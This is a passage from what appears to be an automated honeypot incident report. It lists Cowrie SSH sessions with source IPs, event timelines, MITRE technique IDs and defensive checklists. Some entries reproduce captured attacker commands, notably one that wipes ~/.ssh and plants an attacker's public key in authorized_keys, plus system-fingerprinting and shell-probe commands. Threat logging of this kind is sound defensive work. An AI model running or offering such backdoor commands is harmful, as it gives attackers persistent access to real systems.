- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d7f9b776213

| Field | Detail |
|---|---|
| **Source IP** | `5.175.136[.]100` |
| **First Seen** | 2026-08-01 06:49 |
| **Last Seen** | 2026-08-01 06:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:49:53` | `cowrie.session.connect` |
| `2026-08-01 06:49:53` | `cowrie.client.version` |
| `2026-08-01 06:49:53` | `cowrie.client.kex` |
| `2026-08-01 06:49:54` | `cowrie.login.success` |
| `2026-08-01 06:49:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.175.136[.]100` to AbuseIPDB if not already reported
- [ ] Block `5.175.136[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83dd7e11292d

| Field | Detail |
|---|---|
| **Source IP** | `5.175.136[.]100` |
| **First Seen** | 2026-08-01 06:49 |
| **Last Seen** | 2026-08-01 06:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:49:54` | `cowrie.session.connect` |
| `2026-08-01 06:49:54` | `cowrie.client.version` |
| `2026-08-01 06:49:55` | `cowrie.client.kex` |
| `2026-08-01 06:49:56` | `cowrie.login.success` |
| `2026-08-01 06:49:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.175.136[.]100` to AbuseIPDB if not already reported
- [ ] Block `5.175.136[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aad43821eb08

| Field | Detail |
|---|---|
| **Source IP** | `192.34.62[.]126` |
| **First Seen** | 2026-08-01 06:53 |
| **Last Seen** | 2026-08-01 06:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:53:42` | `cowrie.session.connect` |
| `2026-08-01 06:53:42` | `cowrie.client.version` |
| `2026-08-01 06:53:42` | `cowrie.client.kex` |
| `2026-08-01 06:53:42` | `cowrie.login.success` |
| `2026-08-01 06:53:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.34.62[.]126` to AbuseIPDB if not already reported
- [ ] Block `192.34.62[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63b479eaf8fd

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-01 06:53 |
| **Last Seen** | 2026-08-01 06:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:53:42` | `cowrie.session.connect` |
| `2026-08-01 06:53:42` | `cowrie.client.version` |
| `2026-08-01 06:53:42` | `cowrie.client.kex` |
| `2026-08-01 06:53:43` | `cowrie.login.success` |
| `2026-08-01 06:53:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e61865fd25c

| Field | Detail |
|---|---|
| **Source IP** | `203.55.131[.]3` |
| **First Seen** | 2026-08-01 06:54 |
| **Last Seen** | 2026-08-01 06:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:54:45` | `cowrie.session.connect` |
| `2026-08-01 06:54:45` | `cowrie.login.success` |
| `2026-08-01 06:54:45` | `cowrie.session.params` |
| `2026-08-01 06:54:45` | `cowrie.command.input` |
| `2026-08-01 06:54:45` | `cowrie.command.input` |
| `2026-08-01 06:54:45` | `cowrie.command.failed` |
| `2026-08-01 06:54:45` | `cowrie.command.input` |
| `2026-08-01 06:54:45` | `cowrie.command.failed` |
| `2026-08-01 06:54:45` | `cowrie.command.input` |
| `2026-08-01 06:54:46` | `cowrie.log.closed` |
| `2026-08-01 06:54:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.55.131[.]3` to AbuseIPDB if not already reported
- [ ] Block `203.55.131[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e83ba193d761

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-01 06:58 |
| **Last Seen** | 2026-08-01 06:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:58:05` | `cowrie.session.connect` |
| `2026-08-01 06:58:06` | `cowrie.client.version` |
| `2026-08-01 06:58:06` | `cowrie.client.kex` |
| `2026-08-01 06:58:09` | `cowrie.login.success` |
| `2026-08-01 06:58:11` | `cowrie.session.params` |
| `2026-08-01 06:58:11` | `cowrie.command.input` |
| `2026-08-01 06:58:11` | `cowrie.command.input` |
| `2026-08-01 06:58:11` | `cowrie.command.input` |
| `2026-08-01 06:58:11` | `cowrie.command.input` |
| `2026-08-01 06:58:11` | `cowrie.command.input` |
| `2026-08-01 06:58:11` | `cowrie.command.success` |
| `2026-08-01 06:58:11` | `cowrie.command.input` |
| `2026-08-01 06:58:11` | `cowrie.command.input` |
| `2026-08-01 06:58:11` | `cowrie.command.input` |
| `2026-08-01 06:58:11` | `cowrie.command.input` |
| `2026-08-01 06:58:12` | `cowrie.log.closed` |
| `2026-08-01 06:58:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04e604166625

| Field | Detail |
|---|---|
| **Source IP** | `124.239.169[.]52` |
| **First Seen** | 2026-08-01 06:59 |
| **Last Seen** | 2026-08-01 06:59 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:59:00` | `cowrie.session.connect` |
| `2026-08-01 06:59:01` | `cowrie.client.version` |
| `2026-08-01 06:59:01` | `cowrie.client.kex` |
| `2026-08-01 06:59:03` | `cowrie.login.success` |
| `2026-08-01 06:59:04` | `cowrie.direct-tcpip.request` |
| `2026-08-01 06:59:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.239.169[.]52` to AbuseIPDB if not already reported
- [ ] Block `124.239.169[.]52` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f002701e6afd

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]134` |
| **First Seen** | 2026-08-01 06:59 |
| **Last Seen** | 2026-08-01 06:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:59:12` | `cowrie.session.connect` |
| `2026-08-01 06:59:13` | `cowrie.client.version` |
| `2026-08-01 06:59:13` | `cowrie.client.kex` |
| `2026-08-01 06:59:15` | `cowrie.login.success` |
| `2026-08-01 06:59:15` | `cowrie.direct-tcpip.request` |
| `2026-08-01 06:59:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]134` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]134` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-850c8f9016c1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-01 07:00 |
| **Last Seen** | 2026-08-01 07:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:00:34` | `cowrie.session.connect` |
| `2026-08-01 07:00:34` | `cowrie.client.version` |
| `2026-08-01 07:00:34` | `cowrie.client.kex` |
| `2026-08-01 07:00:38` | `cowrie.login.success` |
| `2026-08-01 07:00:40` | `cowrie.session.params` |
| `2026-08-01 07:00:40` | `cowrie.command.input` |
| `2026-08-01 07:00:40` | `cowrie.command.input` |
| `2026-08-01 07:00:40` | `cowrie.command.input` |
| `2026-08-01 07:00:40` | `cowrie.command.input` |
| `2026-08-01 07:00:40` | `cowrie.command.input` |
| `2026-08-01 07:00:40` | `cowrie.command.success` |
| `2026-08-01 07:00:40` | `cowrie.command.input` |
| `2026-08-01 07:00:40` | `cowrie.command.input` |
| `2026-08-01 07:00:40` | `cowrie.command.input` |
| `2026-08-01 07:00:40` | `cowrie.command.input` |
| `2026-08-01 07:00:41` | `cowrie.log.closed` |
| `2026-08-01 07:00:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f84f94a78210

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-01 07:00 |
| **Last Seen** | 2026-08-01 07:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:00:50` | `cowrie.session.connect` |
| `2026-08-01 07:00:50` | `cowrie.client.version` |
| `2026-08-01 07:00:50` | `cowrie.client.kex` |
| `2026-08-01 07:00:50` | `cowrie.login.success` |
| `2026-08-01 07:00:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ba213f16834

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-01 07:00 |
| **Last Seen** | 2026-08-01 07:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:00:50` | `cowrie.session.connect` |
| `2026-08-01 07:00:50` | `cowrie.client.version` |
| `2026-08-01 07:00:50` | `cowrie.client.kex` |
| `2026-08-01 07:00:50` | `cowrie.login.success` |
| `2026-08-01 07:00:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7aff49d73a3c

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-01 07:00 |
| **Last Seen** | 2026-08-01 07:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:00:53` | `cowrie.session.connect` |
| `2026-08-01 07:00:53` | `cowrie.client.version` |
| `2026-08-01 07:00:53` | `cowrie.client.kex` |
| `2026-08-01 07:00:53` | `cowrie.login.success` |
| `2026-08-01 07:00:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-146e22d95801

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-01 07:00 |
| **Last Seen** | 2026-08-01 07:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:00:53` | `cowrie.session.connect` |
| `2026-08-01 07:00:53` | `cowrie.client.version` |
| `2026-08-01 07:00:53` | `cowrie.client.kex` |
| `2026-08-01 07:00:53` | `cowrie.login.success` |
| `2026-08-01 07:00:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9df010bc613

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-01 07:03 |
| **Last Seen** | 2026-08-01 07:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:03:00` | `cowrie.session.connect` |
| `2026-08-01 07:03:00` | `cowrie.client.version` |
| `2026-08-01 07:03:00` | `cowrie.client.kex` |
| `2026-08-01 07:03:04` | `cowrie.login.success` |
| `2026-08-01 07:03:06` | `cowrie.session.params` |
| `2026-08-01 07:03:06` | `cowrie.command.input` |
| `2026-08-01 07:03:06` | `cowrie.command.input` |
| `2026-08-01 07:03:06` | `cowrie.command.input` |
| `2026-08-01 07:03:06` | `cowrie.command.input` |
| `2026-08-01 07:03:06` | `cowrie.command.input` |
| `2026-08-01 07:03:06` | `cowrie.command.success` |
| `2026-08-01 07:03:06` | `cowrie.command.input` |
| `2026-08-01 07:03:06` | `cowrie.command.input` |
| `2026-08-01 07:03:06` | `cowrie.command.input` |
| `2026-08-01 07:03:06` | `cowrie.command.input` |
| `2026-08-01 07:03:07` | `cowrie.log.closed` |
| `2026-08-01 07:03:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d8a455515aa

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-01 07:07 |
| **Last Seen** | 2026-08-01 07:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:07:49` | `cowrie.session.connect` |
| `2026-08-01 07:07:50` | `cowrie.client.version` |
| `2026-08-01 07:07:50` | `cowrie.client.kex` |
| `2026-08-01 07:07:53` | `cowrie.login.success` |
| `2026-08-01 07:07:55` | `cowrie.session.params` |
| `2026-08-01 07:07:55` | `cowrie.command.input` |
| `2026-08-01 07:07:55` | `cowrie.command.input` |
| `2026-08-01 07:07:55` | `cowrie.command.input` |
| `2026-08-01 07:07:55` | `cowrie.command.input` |
| `2026-08-01 07:07:55` | `cowrie.command.input` |
| `2026-08-01 07:07:55` | `cowrie.command.success` |
| `2026-08-01 07:07:55` | `cowrie.command.input` |
| `2026-08-01 07:07:55` | `cowrie.command.input` |
| `2026-08-01 07:07:55` | `cowrie.command.input` |
| `2026-08-01 07:07:55` | `cowrie.command.input` |
| `2026-08-01 07:07:56` | `cowrie.log.closed` |
| `2026-08-01 07:07:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f371f93527d7

| Field | Detail |
|---|---|
| **Source IP** | `107.180.88[.]176` |
| **First Seen** | 2026-08-01 07:07 |
| **Last Seen** | 2026-08-01 07:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:07:50` | `cowrie.session.connect` |
| `2026-08-01 07:07:50` | `cowrie.client.version` |
| `2026-08-01 07:07:50` | `cowrie.client.kex` |
| `2026-08-01 07:07:50` | `cowrie.login.success` |
| `2026-08-01 07:07:51` | `cowrie.session.params` |
| `2026-08-01 07:07:51` | `cowrie.command.input` |
| `2026-08-01 07:07:51` | `cowrie.command.failed` |
| `2026-08-01 07:07:51` | `cowrie.log.closed` |
| `2026-08-01 07:07:51` | `cowrie.session.params` |
| `2026-08-01 07:07:51` | `cowrie.command.input` |
| `2026-08-01 07:07:52` | `cowrie.session.file_download` |
| `2026-08-01 07:07:52` | `cowrie.log.closed` |
| `2026-08-01 07:07:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.180.88[.]176` to AbuseIPDB if not already reported
- [ ] Block `107.180.88[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5717d019760b

| Field | Detail |
|---|---|
| **Source IP** | `107.180.88[.]176` |
| **First Seen** | 2026-08-01 07:07 |
| **Last Seen** | 2026-08-01 07:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:07:52` | `cowrie.session.connect` |
| `2026-08-01 07:07:52` | `cowrie.client.version` |
| `2026-08-01 07:07:52` | `cowrie.client.kex` |
| `2026-08-01 07:07:52` | `cowrie.login.success` |
| `2026-08-01 07:07:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.180.88[.]176` to AbuseIPDB if not already reported
- [ ] Block `107.180.88[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74d53fdd6b76

| Field | Detail |
|---|---|
| **Source IP** | `107.180.88[.]176` |
| **First Seen** | 2026-08-01 07:07 |
| **Last Seen** | 2026-08-01 07:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:07:52` | `cowrie.session.connect` |
| `2026-08-01 07:07:52` | `cowrie.client.version` |
| `2026-08-01 07:07:52` | `cowrie.client.kex` |
| `2026-08-01 07:07:52` | `cowrie.login.success` |
| `2026-08-01 07:07:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.180.88[.]176` to AbuseIPDB if not already reported
- [ ] Block `107.180.88[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d099175b876a

| Field | Detail |
|---|---|
| **Source IP** | `35.240.24[.]252` |
| **First Seen** | 2026-08-01 07:09 |
| **Last Seen** | 2026-08-01 07:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:09:13` | `cowrie.session.connect` |
| `2026-08-01 07:09:13` | `cowrie.login.success` |
| `2026-08-01 07:09:13` | `cowrie.session.params` |
| `2026-08-01 07:09:13` | `cowrie.command.input` |
| `2026-08-01 07:09:13` | `cowrie.command.input` |
| `2026-08-01 07:09:13` | `cowrie.command.failed` |
| `2026-08-01 07:09:13` | `cowrie.command.input` |
| `2026-08-01 07:09:13` | `cowrie.log.closed` |
| `2026-08-01 07:09:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.240.24[.]252` to AbuseIPDB if not already reported
- [ ] Block `35.240.24[.]252` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dca0a585c2ee

| Field | Detail |
|---|---|
| **Source IP** | `45.74.3[.]137` |
| **First Seen** | 2026-08-01 07:09 |
| **Last Seen** | 2026-08-01 07:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:09:17` | `cowrie.session.connect` |
| `2026-08-01 07:09:17` | `cowrie.login.success` |
| `2026-08-01 07:09:18` | `cowrie.session.params` |
| `2026-08-01 07:09:18` | `cowrie.command.input` |
| `2026-08-01 07:09:19` | `cowrie.command.input` |
| `2026-08-01 07:09:20` | `cowrie.command.input` |
| `2026-08-01 07:09:20` | `cowrie.command.input` |
| `2026-08-01 07:09:20` | `cowrie.command.failed` |
| `2026-08-01 07:09:21` | `cowrie.log.closed` |
| `2026-08-01 07:09:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.74.3[.]137` to AbuseIPDB if not already reported
- [ ] Block `45.74.3[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b95b57f3f88

| Field | Detail |
|---|---|
| **Source IP** | `35.240.24[.]252` |
| **First Seen** | 2026-08-01 07:09 |
| **Last Seen** | 2026-08-01 07:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:09:26` | `cowrie.session.connect` |
| `2026-08-01 07:09:26` | `cowrie.login.success` |
| `2026-08-01 07:09:27` | `cowrie.session.params` |
| `2026-08-01 07:09:27` | `cowrie.command.input` |
| `2026-08-01 07:09:27` | `cowrie.command.failed` |
| `2026-08-01 07:09:29` | `cowrie.log.closed` |
| `2026-08-01 07:09:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.240.24[.]252` to AbuseIPDB if not already reported
- [ ] Block `35.240.24[.]252` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1b5f9932c9d

| Field | Detail |
|---|---|
| **Source IP** | `35.240.24[.]252` |
| **First Seen** | 2026-08-01 07:09 |
| **Last Seen** | 2026-08-01 07:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:09:28` | `cowrie.session.connect` |
| `2026-08-01 07:09:28` | `cowrie.login.success` |
| `2026-08-01 07:09:29` | `cowrie.session.params` |
| `2026-08-01 07:09:29` | `cowrie.command.input` |
| `2026-08-01 07:09:29` | `cowrie.log.closed` |
| `2026-08-01 07:09:29` | `cowrie.session.closed` |

